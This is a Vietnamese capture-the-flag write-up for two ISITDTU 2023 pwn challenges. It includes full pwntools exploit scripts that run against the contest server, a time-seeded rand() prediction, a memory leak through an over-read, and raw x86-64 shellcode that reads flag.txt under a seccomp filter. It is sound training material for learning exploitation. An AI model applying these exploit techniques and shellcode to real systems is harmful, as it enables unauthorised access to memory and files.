# ISITDU CTF Quals 2023 WriteUp
## Đôi lời tâm sự:
Author: SeaWind (J4ckP0t)
Ở giải CTF này thì mình đã giải được 2 challenges cũng tương đối dễ trên tổng số 6 challenges về mảng pwn.

Nói chung là mình hơi tiếc vì còn một challenge mà mình nghĩ là mình có thể gần với đáp án rồi, nhưng chưa biết triển khai ra sao.

Còn những bài còn lại thì chịu :V 

Dài dòng thế là đủ rồi, đến phần writeup thôi.

## Time Controller
- Đề bài: [Challenge_link](https://ctf.isitdtu.com/files/4b8da8bdb5fa7d8ed990418c23457005/ForUser.zip?token=eyJ1c2VyX2lkIjoxNDcwLCJ0ZWFtX2lkIjo4NzksImZpbGVfaWQiOjI5fQ.ZS5zPg.ku8B6yfdkkf2Li_Qj-OhAA1M2Ts)
- Solution:

Đầu tiên thì file challenge đã cho ta đủ công cụ cần thiết để thiết lập một dockerfile để từ đó ta có thể thử mô phỏng solution của ta trên chính docker đó

Tiếp đến ta sẽ tiến hành checksec các mitigations của challenge:

![](https://hackmd.io/_uploads/ByOxoWn-p.png)

Việc bật full mitigations của challenge sẽ khiến việc khai thác lỗ hổng trở nên khó khăn hơn

Tiếp đến kiểm tra mã giả của challenge thông qua IDA Pro:

![](https://hackmd.io/_uploads/BJEjjZhZp.png)

Ta sẽ tiến hành phân tích luồng thực thi chương trình:
1. Đầu tiên chương trình sẽ gọi đến hàm Elementary_Magic 

![](https://hackmd.io/_uploads/HJwlhWh-6.png)

Hàm sẽ dùng hàm rand() trong với seed là kết quả của time(0) (trả về thời gian hiện tại), đồng thời chương trình sẽ đã leak ra giùm ta seed của nó. Điều này sẽ giúp ta giải quyết challenge dễ hơn

Khi ta có được seed rồi, hiển nhiên ta sẽ tìm được giá trị của biến `v2` (kết quả hàm rand()) và cả biến `v3` (giá trị của hàm time(0)) 

Chương trình sẽ yêu cầu nhập 20 bytes input và convert sang thành số. Sau đó tiến hành xor với `v2` và `v3` và kiểm tra xem có bằng `0xDEADBEEFDEADC0DE`. Nếu không thì chương trình sẽ tự thoát.

2. Kế đến nếu giải quyết được bài toán của hàm Elementary_Magic thì sẽ gọi đến hàm Advanced_Magic

![](https://hackmd.io/_uploads/HkdJ0Zn-p.png)

Ở hàm này thì đầu tiên chương trình sẽ đọc 8 bytes ngẫu nhiên lấy trong `/dev/urandom` và tiến hành copy giá trị 8 bytes ấy vào trong biến `v5`

Sau đó hàm sẽ đọc 0x20 (32) bytes của mình và in ra input (ở đây ta có thể lợi dụng lỗ hổng của hàm read và put để leak ra được 8 bytes trong biến `random_bytes`, chi tiết thì mình sẽ để [link](https://github.com/Naetw/CTF-pwn-tips#overflow) này để tham khảo)

Cho nên đến lúc này ta có được giá trị của biến `v5` và cả biến `v6` (giá trị của hàm rand() với seed là giá trị của hàm time(0))

Chương trình sẽ yêu cầu nhập 20 bytes input và convert sang thành số. Sau đó tiến hành xor với `v5` và `v6` và kiểm tra xem có bằng `0xDEADBEEFDEADC0DE`. Nếu không thì chương trình sẽ tự thoát.

Và phần thưởng cho ta khi giải được 2 hàm này là hàm win() sẽ đọc flag cho chúng ta.

![](https://hackmd.io/_uploads/H1uD1z3bp.png)

Mấu chốt của bài này là phải biết lợi dụng lấy bù 2 của một số. Bởi vì hàm xor có thể dịch ngược được giá trị cần tìm (kiểu như nếu `A XOR B = C` thì tương đương `A = C XOR B`)
thì giá trị ta cần tìm sẽ rất lớn (lớn hơn 20 bytes mà hàm cho phép ta nhập)

Chính vì thế ta phải biết quy tắc lấy bù 2 của một số (vì hàm không có giới hạn ta không được nhập số âm)

Về nguyên lý bù 2 thì mình sẽ để [link](https://vi.wikipedia.org/wiki/B%C3%B9_2) này để mọi người tham khảo.
- Answer: Đây là script giải ra bài này của mình:
```python!=
from pwn import *
from ctypes import CDLL
from bitstring import Bits
script = """

b*main+88
c
"""
libc = CDLL("libc.so.6")
context.binary='./challenge'

#p = process()
#p = gdb.debug('./challenge',script)
leak_seed2 = libc.time(0)
p = remote('34.126.117.161', 2000)
p.recvline()
leak_seed = int(p.recvline().strip(b'\n').decode())

log.info("Leak seed: %d", leak_seed)
print(p.recv())
p.sendline()
#log.info("Leak seed 2: %d", leak_seed2)
libc.srand(leak_seed)
v2 = libc.rand()
#time.sleep(8)
v3 = libc.time(0)
#v3 += 3
print(hex(v2))
print(hex(v3))
payload1 = 0xDEADC0DE ^ v2 ^ v3
payload1 = -2401053092612145152 | payload1
p.recv()
p.send(str(payload1).encode())
p.sendline(b'1')
p.send(b'A'*31+b'B')
p.recvuntil(b'B')
leak_random = u64(p.recvline().strip(b'\n').ljust(8,b'\x00'))
log.info("Leak random: %s", hex(leak_random))
#time.sleep(0.2)
#msg = p.recv()
#if b"What the hell are you shouting? It's disappointing~" not in msg: break
#p.close()
temp = libc.time(0)
#temp = temp + 1
print(temp)
libc.srand(leak_seed)
v6 = libc.rand()
payload2 = 0xDEADBEEFDEADC0DE ^ leak_random ^ v6
#temp2 = int(hex(payload2 & 0xffffffff),base=16) ^ v6
#temp3 = int(hex(payload2)[:-8] + '0'*8,base=16) | temp2
bin_payload2 = bin(payload2)
temp4 = Bits(bin=bin_payload2)
final_payload = temp4.int
print(v6)
print(payload2)
log.info("Final payload :%d", final_payload)
print(p.recv())
p.sendline()
#payload2 = 0xDEADC0DE ^ v6 ^ leak_random
#payload2 = -2401053092612145152 | payload2
p.send(str(final_payload).encode())
p.interactive()
```
:bulb: **==Flag:ISITDTU{3133ae9afd7ac43ecd0fbd0a3c128b5ef5a0674b}==**


## Ez get flag
- Đề bài: [Challenge_link](https://ctf.isitdtu.com/files/bcfd62046ae7662160a10cdf1a8440fc/ForUser.zip?token=eyJ1c2VyX2lkIjoxNDcwLCJ0ZWFtX2lkIjo4NzksImZpbGVfaWQiOjQ1fQ.ZS5z9Q.fBjbyi_atWZ8svZkz-NHAM3WHH0)
- Solution:

Đầu tiên thì file challenge đã cho ta đủ công cụ cần thiết để thiết lập một dockerfile để từ đó ta có thể thử mô phỏng solution của ta trên chính docker đó

Tiếp đến ta sẽ tiến hành checksec các mitigations của challenge:

![](https://hackmd.io/_uploads/BkqiZzhZT.png)

Oh wow! Không có mitigations được bật. Một mảnh đất màu mỡ để khai thác lỗ hổng :face_with_hand_over_mouth: 

Tiếp đến kiểm tra mã giả của challenge thông qua IDA Pro:

![](https://hackmd.io/_uploads/Hy2QGz3b6.png)

Hướng giải của mình ở đầu là vì chương trình sẽ đọc 0x1000 bytes từ input của mình (và đồng thời sẽ thực thi shellcode của mình thêm vào)

![](https://hackmd.io/_uploads/HyOczM3Zp.png)

Nhưng vì challenge này có sự can thiệp của seccomp nên mình sẽ kiểm tra seccomp của challenge này.

![](https://hackmd.io/_uploads/HkFRzM3-a.png)

Nói một cách dễ hiểu thì seccomp sẽ giới hạn số lượng hàm mà mình có thể syscall trong chương trình

Cụ thể trong challenge này thì chỉ cho phép sử dụng syscall của hàm **open, write, read, writew, exit_group, exit, getegid, setpriority, openat, sendfile, alarm, readlink, pread64, readv, writev**, còn lại thì chương trình sẽ kill process và dừng chương trình

Với nhiêu đây syscall cũng đủ để mình có thể đọc được file flag.txt của challenge này rồi

Mình sẽ dùng syscall của `open('flag.txt', 0, 0)` và syscall của `sendfile(1,(open('flag.txt'),0,0),0,0x1000)`
để đọc flag.

Còn về các syscall trong x86-x64 thì mình sẽ để [link](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md) này để tham khảo

Đây là shellcode mà mình sử dụng với ý tưởng đã nêu ở trên.

![](https://hackmd.io/_uploads/BJ4PVMhZ6.png)


- Answer: Đây là script giải ra bài của mình:
```python!=
from pwn import *
context.binary='./challenge'
#p = process()
p = remote('34.126.117.161',3000)
script = """
b*main+147
c
"""
#p = gdb.debug('./challenge',script)
payload = cyclic(0x141)
payload += b'\x48\x31\xDB\x48\xBB\x66\x6C\x61\x67\x2E\x74\x78\x74\x6A\x00\x53\x48\x31\xDB\x48\xBB\x2E\x2F\x2F\x2F\x2F\x2F\x2F\x2F\x53\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\xB0\x02\x0F\x05\x48\x31\xFF\x48\x83\xC7\x01\x89\xC6\x48\x31\xD2\x4D\x31\xD2\x49\xC7\xC2\x00\x10\x00\x00\x48\x31\xC0\xB0\x28\x0F\x05'
p.sendline(payload)
p.interactive()
```


:bulb: **==Flag:ISITDTU{279e01f8ba05dd9da4010ddb184007cc3fa6d0198cb94eba0f43926ee4c19f68}==**